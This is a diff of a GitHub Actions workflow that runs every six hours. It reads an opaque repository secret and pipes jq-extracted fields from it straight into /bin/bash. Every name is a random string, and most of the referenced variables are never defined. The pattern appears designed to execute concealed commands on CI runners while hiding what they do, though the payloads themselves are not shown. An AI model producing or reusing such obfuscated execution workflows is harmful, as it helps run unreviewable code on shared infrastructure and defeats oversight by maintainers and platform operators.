@@ -3,21 +3,29 @@ name: qiaofengshang7890
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 0/6 * * *'
-jobs:  # 19299
+    - cron: '37 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qiaofengshang7890
         env:
-          b6: ${{ secrets.b6 }}
+          pxyvv9: ${{ secrets.pxyvv9 }}
         run: |
-          echo $b6 | jq -r .hwjd79 | /bin/bash
-          echo $c201 | jq -r .h864 | /bin/bash
-          echo $qgb1 | jq -r .h736 | /bin/bash
-          echo $iahih14 | jq -r .uxzws130 | /bin/bash
-          echo $squzo87141 | jq -r .kp37 | /bin/bash
-          echo $x6029 | jq -r .ac22 | /bin/bash
-          echo $re06 | jq -r .qjain878 | /bin/bash
+          echo $pxyvv9 | jq -r .vn414 | /bin/bash
+          echo $guqnz7 | jq -r .vfmt3 | /bin/bash
+          echo $x5900 | jq -r .up8367 | /bin/bash
+          echo $lhc2412 | jq -r .faes15799 | /bin/bash
+          echo $ge9101 | jq -r .bxbu20 | /bin/bash
+          echo $qwgzf76496 | jq -r .c4522 | /bin/bash
+          echo $gq0 | jq -r .y2795 | /bin/bash
+          echo $zpn8012 | jq -r .mxas5143 | /bin/bash
+          echo $qsafl0 | jq -r .qg358 | /bin/bash
+          echo $qd320 | jq -r .s25 | /bin/bash
+          echo $nqrx8936 | jq -r .v54888 | /bin/bash
+          echo $eql2 | jq -r .jxa14 | /bin/bash
+          echo $f859 | jq -r .xjq05891 | /bin/bash
+          echo $y0048 | jq -r .onke1 | /bin/bash
 
